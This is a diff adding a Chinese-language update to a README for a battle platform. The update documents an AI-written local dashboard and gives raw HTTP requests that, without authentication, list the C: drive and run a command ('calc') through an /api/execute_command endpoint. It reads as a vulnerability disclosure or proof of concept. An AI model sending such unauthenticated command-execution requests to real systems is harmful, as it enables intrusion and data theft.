@@ -12,6 +12,35 @@
 
 ---
 
+# 2026/6/15 12:33 更新
+
+面板地址:127.0.0.1/dashboard/login AI写的面板
+
+![450a6320ee75720ddbcfc8a9d0bac9e3](./README/450a6320ee75720ddbcfc8a9d0bac9e3.png)
+
+读取C盘下的文件
+
+```HTTP
+GET /api/list_directory?path=C:/ HTTP/1.1
+Content-Type: application/json
+Host: 127.0.0.1:54425
+
+```
+
+![bb89e47f08f1a73d42f838582d67fdd6](./README/bb89e47f08f1a73d42f838582d67fdd6.png)
+
+好像貌似鉴权不是很好用，未授权
+
+```HTTP
+GET /api/execute_command?command=calc HTTP/1.1
+Content-Type: application/json
+Host: 127.0.0.1:54425
+```
+
+![0e59757167fd4d4a61f1aa81eb0f856b](./README/0e59757167fd4d4a61f1aa81eb0f856b.png)
+
+
+
 ## 1. 执行摘要（Executive Summary）
 
 R0 对战平台由两部分组成：
